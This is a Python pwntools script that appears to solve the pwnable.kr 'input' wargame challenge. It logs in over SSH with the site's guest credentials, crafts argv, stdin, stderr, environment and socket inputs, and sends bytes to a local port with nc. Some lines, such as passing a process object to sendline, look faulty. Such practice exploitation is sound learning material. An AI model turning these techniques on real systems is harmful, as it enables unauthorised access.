from pwn import *
import os
s = ssh(host='pwnable.kr',
        user='input2',
        password='guest',
        port=2222)

sock_port = 8999;
  
arr = [b'\x00']*100
arr[0] = 'input'
arr[66] = b'\x20\x0a\x0d'
arr[67] = str(sock_port)

p = s.process(['cat', '-'], stdout='/tmp/huck/stderr')
p.sendline(b'\x00\x0a\x02\xff')
p.kill()

p = s.process(['cat', '-'], stdout=b'/tmp/huck/\x0a') 
p.sendline(b'\x00'*4)
p.kill()

p = s.process(['truncate', '-s-1', '/tmp/huck/\x0a'])

shell = s.shell('/bin/sh', tty=True)
p = s.process(arr, stderr='/tmp/huck/stderr', env={b'\xde\xad\xbe\xef': b'\xca\xfe\xba\xbe'}, cwd="/tmp/huck/", run=False);

shell.sendline(p)
shell.sendline(b'\x00\x0a\x00\xff')

shell2 = s.shell('/bin/sh')
shell2.sendline('python -c "print \'\\xde\\xad\\xbe\\xef\'" | nc localhost '+str(sock_port));

shell.interactive()
